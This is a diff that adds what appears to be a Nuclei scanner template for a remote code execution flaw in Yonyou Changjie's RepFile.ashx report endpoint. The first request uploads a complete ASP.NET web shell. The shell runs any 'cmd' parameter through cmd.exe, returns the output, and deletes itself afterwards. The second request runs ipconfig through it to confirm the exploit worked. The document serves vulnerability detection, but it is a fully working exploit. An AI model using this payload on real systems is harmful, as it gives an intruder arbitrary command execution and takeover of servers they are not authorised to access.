@@ -1,0 +1,95 @@
+id: yonyou-Changjie-RepFile-RCE
+info:
+  name: yonyou-Changjie-RepFile-RCE
+  author: lemonlove7
+  severity: critical
+flow: http(1) && http(2)
+http:
+  - raw:
+      - |-
+        POST /ReportDesign/RepFile.ashx?RepFile=pages/rce.aspx&Type=SaveRepFileData HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+        Connection: keep-alive
+        Content-Length: 1509
+        Content-Type: application/x-www-form-urlencoded
+        SOAPAction: 
+        Accept-Encoding: gzip, deflate, br
+        
+        <script runat="server" language="C#">
+            protected void Page_Load(object sender, EventArgs e)
+            {
+                Response.Clear();
+                Response.ContentType = "text/plain";
+                try
+                {
+                    string command = Request["cmd"];
+                    if (string.IsNullOrEmpty(command))
+                    {
+                        return;
+                    }
+                    System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
+                    psi.FileName = "cmd.exe";
+                    psi.Arguments = "/c " + command;
+                    psi.RedirectStandardOutput = true;
+                    psi.UseShellExecute = false;
+                    psi.CreateNoWindow = true;
+                    using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
+                    {
+                        using (System.IO.StreamReader reader = process.StandardOutput)
+                        {
+                            string result = reader.ReadToEnd();
+                            Response.Write(result);
+                        }
+                    }
+                }
+                catch (System.Exception ex)
+                {
+                    Response.Write("Error executing command: " + ex.Message + "\n");
+                    Response.Write(ex.StackTrace);
+                }
+                finally
+                {
+                    try
+                    {
+                        string filePath = Server.MapPath(Request.ServerVariables["SCRIPT_NAME"]);
+                        System.IO.File.Delete(filePath);
+                    }
+                    catch { }
+                   
+                    Response.End();
+                }
+            }
+        </script>
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        part: body
+        words:
+          - success
+        internal: true
+    matchers-condition: and
+  - raw:
+      - |-
+        GET /Report/Pages/rce.aspx?cmd=ipconfig HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=gbdtpxlx0uqby5q4ggfybccr
+        Connection: keep-alive
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - Windows IP 配置
+    matchers-condition: and
